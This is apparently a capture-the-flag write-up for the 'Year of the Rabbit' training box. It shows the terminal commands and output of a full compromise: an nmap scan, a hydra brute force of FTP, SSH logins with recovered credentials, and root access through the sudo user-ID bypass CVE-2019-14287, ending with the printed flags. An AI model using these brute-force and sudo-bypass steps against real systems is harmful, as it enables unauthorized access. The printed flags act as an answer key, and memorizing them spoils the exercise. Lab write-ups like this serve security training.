# Task 1 Flags
----

Let's have a nice gentle start to the New Year!
Can you hack into the Year of the Rabbit box without falling down a hole?

(Please ensure your volume is turned up!)

## SCANNING

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.184.23
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-19 23:15 EST
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 23:17 (0:00:03 remaining)
Nmap scan report for 10.10.184.23
Host is up (0.26s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.20 seconds
````

## ENUMERATING TO GET THE FTP USER

```bash
# With gobuster we found the assets directory and there is a css file in that we have sup3r_s3cr3t_fl4g.php file if we wget it we can see the redirection to hidden directory, which has the ftpuser.

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ wget http://10.10.184.23/sup3r_s3cr3t_fl4g.php                                            
--2022-02-19 23:35:17--  http://10.10.184.23/sup3r_s3cr3t_fl4g.php
Connecting to 10.10.184.23:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU [following]
--2022-02-19 23:35:18--  http://10.10.184.23/intermediary.php?hidden_directory=/WExYY2Cv-qU
Reusing existing connection to 10.10.184.23:80.
HTTP request sent, awaiting response... 302 Found
Location: /sup3r_s3cret_fl4g [following]
--2022-02-19 23:35:18--  http://10.10.184.23/sup3r_s3cret_fl4g
Reusing existing connection to 10.10.184.23:80.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://10.10.184.23/sup3r_s3cret_fl4g/ [following]
--2022-02-19 23:35:19--  http://10.10.184.23/sup3r_s3cret_fl4g/
Reusing existing connection to 10.10.184.23:80.
HTTP request sent, awaiting response... 200 OK
Length: 611 [text/html]
Saving to: ‘sup3r_s3cr3t_fl4g.php’

sup3r_s3cr3t_fl4g.php           100%[====================================================>]     611  --.-KB/s    in 0s      

2022-02-19 23:35:19 (11.1 MB/s) - ‘sup3r_s3cr3t_fl4g.php’ saved [611/611]
                                                                           
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ cat sup3r_s3cr3t_fl4g.php               
<html>
        <head>
                <title>sup3r_s3cr3t_fl4g</title>
        </head>
        <body>
                <noscript>Love it when people block Javascript...<br></noscript>
                <noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
                <script>
                        alert("Word of advice... Turn off your javascript...");
                        window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
                </script>
                <video controls>
                        <source src="/assets/RickRolled.mp4" type="video/mp4">
                </video>
        </body>
</html>

# Go to the hidden directory and downolad the png file

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ strings target.png 

Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

## BRUTE FORCING FTP PASSWORD

```bash
# Brute the ftp server using hydra

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ hydra -l ftpuser -P pass.txt 10.10.184.23 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-19 23:46:36
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.184.23:21/
[21][ftp] host: 10.10.184.23   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-19 23:46:55
```

## LOGGING IN INTO FTP 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ ftp ftpuser@10.10.184.23
Connected to 10.10.184.23.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||64581|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||12434|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |********************************************************************************|   758        1.11 MiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (2.25 KiB/s)

# The creds is encrypted using "Brainf***" language

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <

# Using the online decoder to decrypt the "Brainf***" ecrypted key
User: eli
Password: DSpDiM1wAEwid
```

## GETTING THE USER SHELL 

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ ssh eli@10.10.184.23
eli@10.10.184.23's password: 

1 new message
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden 
message there"
END MESSAGE

eli@year-of-the-rabbit:~$ 
eli@year-of-the-rabbit:~$ find / -name "s3cr3t" 2>/dev/null
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password: MniVCQVhQHUNI
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ 
gwendoline@year-of-the-rabbit:/$ cd home/gwendoline
gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

## PRIVILEGE ESCALATION 

```bash
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

# CVE-2019-14287 explains this breifly, here user is set to -1 which is technically 0 which is root and then running the executable.
# After entering into the 'vi' use :!/bin/sh to get the root shell.

gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

/bin/bash: /sh: No such file or directory

shell returned 127

Press ENTER or type command to continue
gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

----

# ANSWER THE QUESTIONS

1.What is the user flag?
>>

2.What is the root flag?
>>

----